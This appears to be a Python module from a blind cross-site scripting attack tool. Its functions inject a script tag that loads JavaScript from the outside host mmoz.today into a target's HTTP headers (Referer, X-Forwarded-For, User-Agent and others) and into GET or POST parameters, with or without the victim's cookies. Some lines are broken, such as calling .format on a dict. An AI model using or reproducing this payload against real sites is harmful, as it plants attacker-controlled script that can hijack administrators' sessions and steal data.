from helperfuncs_lib import Banner
import requests

def AttackHeaderValues(target,user):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    s.headers.update({'referer': payload})
    s.headers.update({'x-forwarded-for': payload})
    s.headers.update({'x-originating-ip': payload})
    s.headers.update({'x-remote-ip': payload})
    s.headers.update({'x-remote-adrr': payload})
    s.headers.update({'user-agent': payload})
    s.get(target)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
    
# Authenticated Attack HTTP Values
def AttackHeaderValuesAuth(target,user,cookies):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    s.headers.update({'referer': payload})
    s.headers.update({'x-forwarded-for': payload})
    s.headers.update({'x-originating-ip': payload})
    s.headers.update({'x-remote-ip': payload})
    s.headers.update({'x-remote-adrr': payload})
    s.headers.update({'user-agent': payload})
    s.headers.update({'cookie': cookies})  
    s.get(target)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
    
def AttackPostValues(target,user,post):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    data = {'{0}':payload}.format(post)    
    s.post(target,data)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
    
# Authenticated Post Value Attack & Attack HTTP Values
def AttackPostValuesAuth(target,user,post,cookies):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    s.headers.update({'referer': payload})
    s.headers.update({'x-forwarded-for': payload})
    s.headers.update({'x-originating-ip': payload})
    s.headers.update({'x-remote-ip': payload})
    s.headers.update({'x-remote-adrr': payload})
    s.headers.update({'user-agent': payload})
    s.headers.update({'cookie': cookies})
    data = {'{0}':payload}.format(post)    
    s.post(target,data)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
    
def AttackGetValues(target,user,get):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    data = {'{0}':payload}.format(get)    
    s.get(target,data)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
    
# Authenticated Get Value Attack & Attack HTTP Values
def AttackGetValuesAuth(target,user,get,cookies):
    payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
    s = requests.Session()
    s.headers.update({'referer': payload})
    s.headers.update({'x-forwarded-for': payload})
    s.headers.update({'x-originating-ip': payload})
    s.headers.update({'x-remote-ip': payload})
    s.headers.update({'x-remote-adrr': payload})
    s.headers.update({'user-agent': payload})
    s.headers.update({'cookie': cookies})
    data = {'{0}':payload}.format(get)    
    s.get(target,data)
    Banner()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)
